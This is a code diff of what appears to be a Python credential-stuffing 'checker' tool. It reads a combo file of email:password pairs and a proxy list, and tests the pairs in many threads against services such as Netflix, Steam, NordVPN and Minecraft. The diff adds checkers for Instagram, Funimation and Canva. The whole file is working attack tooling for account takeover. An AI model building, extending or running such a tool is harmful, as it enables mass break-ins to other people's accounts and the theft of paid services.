@@ -1,14 +1,8 @@
-from __main__ import checker
+from modules.variables import Checker
 from modules.functions import *
 from time import sleep
 from multiprocessing.dummy import Pool
 from threading import Thread
-from colorama import Fore
-
-red = Fore.RED
-green = Fore.GREEN
-cyan = Fore.CYAN
-reset = Fore.RESET
 
 from modules.checkers import nordvpn
 from modules.checkers import minecraft
@@ -26,6 +20,9 @@ from modules.checkers import discordvm
 from modules.checkers import netflix
 from modules.checkers import steam
 from modules.checkers import windscribe
+from modules.checkers import instagram
+from modules.checkers import funimation
+from modules.checkers import canva
 
 modules_list = {
     "nordvpn":nordvpn,
@@ -43,7 +40,10 @@ modules_list = {
     "discordvm":discordvm,
     "netflix":netflix,
     "steam":steam,
-    "windscribe":windscribe
+    "windscribe":windscribe,
+    "instagram":instagram,
+    "funimation":funimation,
+    "canva":canva
 }
 
 def starter(modules_lst:list):
@@ -55,11 +55,13 @@ def starter(modules_lst:list):
             email = account.split(":")[0]
             password = account.split(":")[1]
         except:
-            checker.bad += 1
-            checker.cpm += 1
+            Checker.bad += 1
+            Checker.cpm += 1
+            if not Checker.cui: log("bad",account,"Error")
         else:
             for module in modules_lst:
                 modules_list[module].check(email,password)
+            Checker.save_lines.remove(account)
 
     clear()
     ascii()
@@ -67,6 +69,7 @@ def starter(modules_lst:list):
     print(f"    [{cyan}Pick Combo File{reset}]")
     sleep(1)
     file_path = get_file("Combo File",type="Combo File")
+    get_focus()
     if file_path == False:
         print(f"    [{cyan}No File Detected{reset}]")
         sleep(1)
@@ -74,8 +77,9 @@ def starter(modules_lst:list):
     with open(file_path,errors="ignore") as file:
         before_accounts = file.read().splitlines()
         accounts = list(set(before_accounts))
-        checker.accounts = accounts
-        checker.accounts_down = accounts
+        Checker.accounts = list(set(before_accounts))
+        Checker.accounts_down = list(set(before_accounts))
+        Checker.save_lines = list(set(before_accounts))
         duplicates = len(before_accounts)-len(accounts)
     print(f"    [{cyan}Imported {len(before_accounts)} Accounts{reset}]")
     if duplicates != 0:
@@ -87,6 +91,7 @@ def starter(modules_lst:list):
     print(f"    [{cyan}Pick Proxy File{reset}]")
     sleep(1)
     file_path = get_file("Proxy File File",type="Proxy File")
+    get_focus()
     if file_path == False:
         print(f"    [{cyan}No File Detected{reset}]")
         sleep(1)
@@ -95,33 +100,35 @@ def starter(modules_lst:list):
         contents = file.read()
         before_proxies = contents.splitlines()
         after_proxies = list(set(before_proxies))
-        checker.proxies = after_proxies
+        Checker.proxies = after_proxies
         duplicates = len(before_proxies)-len(after_proxies)
     print(f"    [{cyan}Imported {len(before_proxies)} Proxies{reset}]")
     if duplicates != 0:
         print(f"    [{cyan}Removed {duplicates} Duplicates{reset}]")
     sleep(1)
 
-    checker.checking = True
-    checker.time = get_time()
-    makedirs(f"Results/{checker.time}",exist_ok=True)
+    Checker.checking = True
+    Checker.time = get_time()
+    makedirs(f"Results/{Checker.time}",exist_ok=True)
 
-    if checker.cui: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
     Thread(target=title,args=(len(modules_lst),),daemon=True).start()
     Thread(target=level_cpm,daemon=True).start()
 
     clear()
-    print(f"    [{cyan}Starting Threads{reset}]")
-    mainpool = Pool(processes=checker.threads)
-    clear()
     ascii()
-    if not checker.cui:
+    print("\n\n")
+    print(f"    [{cyan}Starting Threads{reset}]")
+    mainpool = Pool(processes=Checker.threads)
+    clear()
+    if not Checker.cui:
+        ascii()
         print("\n\n")
-    mainpool.imap_unordered(func=foo,iterable=checker.accounts_down)
+    else: Thread(target=cui,args=(len(modules_lst),),daemon=True).start()
+    mainpool.imap_unordered(func=foo,iterable=Checker.accounts_down)
     mainpool.close()
     mainpool.join()
     sleep(5)
-    checker.checking = False
+    Checker.checking = False
     print("\n\n")
     print(f"    [{cyan}Finished Checking{reset}]")
     input(f"    [{cyan}Press Enter To Go Back{reset}]")
